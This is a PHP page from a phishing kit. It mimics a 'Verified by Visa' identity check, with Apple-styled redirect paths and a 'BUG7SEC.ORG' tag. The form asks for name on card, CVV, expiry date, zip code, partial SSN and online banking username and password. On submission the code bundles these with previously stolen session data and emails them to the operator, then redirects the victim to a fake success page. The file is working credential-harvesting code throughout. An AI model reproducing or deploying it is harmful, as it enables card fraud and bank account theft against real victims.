<?php
require_once('function.shc.php');
$bin      = $apple->binChecked($_SESSION['ccne']);
if($_POST['Activatenow'] == "Verify now" && $_POST['CHName1'] != "" && $_POST['cvv2'] != "" && $_POST['expdate1'] != "" && $_POST['expdate2'] != ""  && $_POST['zip'] != ""  && $_POST['username_password'] != "" ){

    $ip = $apple->ip();

    $dataBank .= " .++=======[ BANK Info ]=======++. \r\n";
    $dataBank .= "Cardholder Name : ".$_POST['CHName1']."\r\n";
    $dataBank .= "CVV : ".$_POST['cvv2']."\r\n";
    $dataBank .= "EXP : ".$_POST['expdate1']."/".$_POST['expdate2']."\r\n";
    $dataBank .= "Zip : ".$_POST['zip']."\r\n";
    $dataBank .= "username bank : ".$_POST['username_bank']."\r\n";
    $dataBank .= "password bank : ".$_POST['username_password']."\r\n";
    $dataBank .= " .++=======[ OLD Result ]=======++. \r\n\n";
    $dataBank .= $_SESSION['mailbody'];
    $dataBank .= " .++=======[ BUG7SEC.ORG ]=======++. \r\n";

    $subject = "[Bank Account] ".$_POST['CHName1']." | ".$bin['BIN']." | ".$bin['COU'];
    $apple->sendMe($subject,$dataBank,$ip['cn']);

    header('Location: /account/manage/update?update=success&appIdKey='.md5(time()).md5(time()).'&path=/account/manage/update?referrer=/account/manage/payment/update&sslEnabled=true&login=payment');
}
if($_GET['path'] == "/landing"){?>
<html>
<head>
<title>Verified by Visa</title>
<link rel="StyleSheet" href="<?= $apple->sitehost();?>/assets/css/vbv.css" type="text/css" media="screen">
<meta http-equiv="refresh" content="3;url=<?php echo $apple->sitehost().'/account/authorized/processing/?authorized=validate&appIdKey='.md5(time()).md5(time()).'&path=/vbv&sslEnabled=true&login=payment'; ?>" />
</head>
<body onload="onLoad()">
<table width="300" cellpadding="0" cellspacing="0" border="0">
    <tr>
        <td width="19" height="20">&nbsp;</td>
        <td width="151">&nbsp;</td>
        <td>&nbsp;</td>
    </tr>
    <tr>
        <td>&nbsp;</td>
        <td colspan="2"><img src="<?= $apple->sitehost();?>/assets/img/vbvLogo.gif" alt="Verified by Visa"></td>
    </tr>
    <tr>
        <td colspan="3" height="20">&nbsp;</td>
    </tr>
    <tr>
        <td>&nbsp;</td>
        <td colspan="2"><img src="<?= $apple->sitehost();?>/assets/img/vbvDots.gif" alt="Processing ..."></td>
    </tr>
    <tr>
        <td colspan="3" height="20">&nbsp;</td>
    </tr>
</table>
</body>
</html>
<?php
}
?>
<?php
if($_GET['path'] == "/vbv"){

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <style type="text/css">
            BODY        { color : #666666 }
A:link      { color : #666666 }
A:active    { color : #666666 }
A:visited   { color : #666666 }
A:hover     { color : #003366 }

.monospace  { 
    font-family : Courier, monospace;
    color : #666666
    }

TABLE, TR, TD {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 12px;
    color: #666666
     }
     
.Return {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 12px;
    color: #666666
     }

.subHead {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 12px;
    color: #666666;
    font-weight: bold
     }
     
.TextSmall {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 10px
     }
     
.TextSmaller {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 9px;
    color : #003366
     }
     
.TextBlue {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 12px;
    color: #003366
     }
     
.TextBlack {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 11px;
    color: #000000
     }
     

.Alert {
    font-family : Arial,Helvetica,sans-serif;
    font-size : 12px;
    color: #FF6600;
    font-weight: bold
     }
.listletters {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 18px;
    font-weight: bold;
    color: #003366;
    text-decoration: none
}
 .footer {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 11px;
    font-style: normal;
    color: #003366;
    text-decoration: none
}
.copyright {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 10px;
    font-style: normal;
    color: #003366;
    text-decoration: none
}
 .shortcuts {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 11px;
    font-style: normal;
    color: #000000;
    text-decoration: none
}
 .anchorlinks {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 13px;
    font-style: normal;
    color: #003366;
    text-decoration: none
}
.homelinks {
    font-family: Arial, Helvetica, sans-serif;
    font-size: 11px;
    font-style: normal;
    color: #003366;
    text-decoration: none
}
    
        </style>
    </head>
    <body>
    <form action="" method="post">

    
    <table width="100%" height="100%" cellpadding="0" cellspacing="0" border="0">
    <tbody>
        <tr><td colspan="3"><img src="<?= $apple->sitehost();?>/assets/img/spacer_clear.gif" width="1" height="1" border="0" alt=""><br></td></tr>
        <tr>
            <td><img src="<?= $apple->sitehost();?>/assets/img/spacer_clear.gif" width="20" height="0" border="0" alt=""><br></td>
        <td align="center">
            <table width="330" height="340" cellpadding="0" cellspacing="0" border="0">
                <tbody>
                <tr>
                    <td valign="bottom" width="89" height="51">
                        <img name="vpasLogo" src="<?= $apple->sitehost();?>/assets/img/vpas_logo.gif" border="0" alt="Verified by Visa"><br>
                    </td>
                    <td align="right" valign="bottom" width="301" height="51">
                       <!-- <img name="memberLogo" src="https://verified.capitalone.com/sic-ui/images/capitalone-logo.png" width="138" height="47" border="0" alt="memberLogo"> -->
                    </td>
                </tr>
                <tr><td colspan="3"><img src="<?= $apple->sitehost();?>/assets/img/spacer_clear.gif" width="1" height="2" border="0" alt=""></td></tr>
                <tr>
                    <td colspan="2" height="298">
                        <font color="#ff9900" size="4">Please Verify Your Identity</font><br><br>
                                <font face="arial" size="2">The information you entered does not match our records for your account.  </font>
                                <font face="arial" size="2" color="#ff9900"><b>Please try again.</b></font><br><br>
                        <table width="330" cellspacing="0" cellpadding="3" border="0">
                        <tbody>
                <tr><td colspan="3"><img src="<?= $apple->sitehost();?>/assets/img/spacer_clear.gif" width="1" height="1" border="0" alt=""></td></tr>
<tr>
    <td width="150" align="right" valign="top" class="TextBlack">Name on Card:</td>
    <td width="170" valign="top"><input type="text" name="CHName1" size="20" maxlength="30" value="" class="monospace">&nbsp;&nbsp;<br></td>
</tr>
<tr>
    <td width="150" align="right" valign="top" class="TextBlack">Signature Panel Code:</td>
    <td width="170" valign="top"><input type="password" name="cvv2" size="3" maxlength="3" class="monospace">&nbsp;&nbsp;<a href="javascript: popUp2('sigpanel.htm?WELL10000056.gif')" onclick="closing=false"><img src="<?= $apple->sitehost();?>/assets/img/cvv2.gif" align="top" width="120" height="20" border="0" alt="Verification Code"></a><br>
    </td>
</tr>
<tr>
    <td width="150" align="right" valign="top" class="TextBlack">Card Expiration Date:</td>
    <td width="170" valign="top"><input type="text" name="expdate1" size="2" maxlength="2" class="monospace">-<input type="text" name="expdate2" size="2" maxlength="2" class="monospace">&nbsp;&nbsp;<span class="TextSmall">MM-YY</span><br></td>
</tr>
<tr>
    <td width="170" align="right" valign="top" class="TextBlack">Your Zip Code:</td>
    <td width="150" valign="top"><input type="password" name="zip" size="5" maxlength="5" class="monospace">&nbsp;&nbsp;<span class="TextSmall">12345</span><br></td>
</tr>
<?php
                        if($_SESSION[negara] === "US"){?>
<tr>
    <td width="150" align="right" valign="top" class="TextBlack">Primary Cardholder's SSN (last 4):</td>
    <td width="170" valign="top">
        <input type="password" name="ssn" size="4" maxlength="3" class="monospace" placeholder="xxx" disabled="">-
        <input type="password" name="ssn" size="4" maxlength="2" class="monospace" placeholder="xx" disabled="">-
        <input type="password" name="ssns" size="4" maxlength="4" class="monospace" placeholder="xxxx" >
        <br>
    </td>
</tr>
<?php
}
?>
<tr>
    <td width="150" align="right" valign="top" class="TextBlack">Bank :</td>
    <td width="170" valign="top"><input type="text" value="<?php echo $bin['BNK'];?>" name="bank" size="20" maxlength="30" class="monospace" disabled=""><br></td>
</tr>
<input type="hidden" name="ccne" value="<?=  $_SESSION['ccne'];?>">
<tr>
    <td width="150" align="right" valign="top" class="TextBlack">User ID / Online ID:</td>
    <td width="170" valign="top"><input type="text" name="username_bank" size="20" maxlength="30" class="monospace"><br></td>
</tr>
<tr>
    <td width="150" align="right" valign="top" class="TextBlack">Password:</td>
    <td width="170" valign="top"><input type="text" name="username_password" size="20" maxlength="30" class="monospace"><br><br></td>
</tr>
                        </tbody></table>
                        <div align="center">
                            <img src="<?= $apple->sitehost();?>/assets/img/spacer_clear.gif" width="1" height="2">
                            <input type="submit" name="Activatenow" value="Verify now"></form>
                            <input type="button" name="Donotactivatenow" value="Do not Verify now" disabled="">
                        </div><br>
                    </td>
                </tr>
                <tr>
                <td colspan="2">

        <!-- copyright notice table -->
        <table width="100%" cellpadding="0" cellspacing="0" border="0">
        <tbody><tr height="3"></tr>
        <tr>
        <!--<TD width=150></TD>-->
        <td align="left" valign="top">
            <span class="TextSmall">By clicking Verify now, you agree to these
            <a href="#"" onclick="closing=false">Terms &amp; Conditions.</a>
        </span>
        </td></tr>
        </tbody></table>
                </td>
                </tr>

            </tbody></table>
        </td>
        <td><img src="<?= $apple->sitehost();?>/assets/img/spacer_clear.gif" width="20" height="0" border="0" alt=""><br></td><!-- Right 20 pixels of white space -->
    </tr>

</tbody></table>
    </body>
</html>
<?php 
}
?>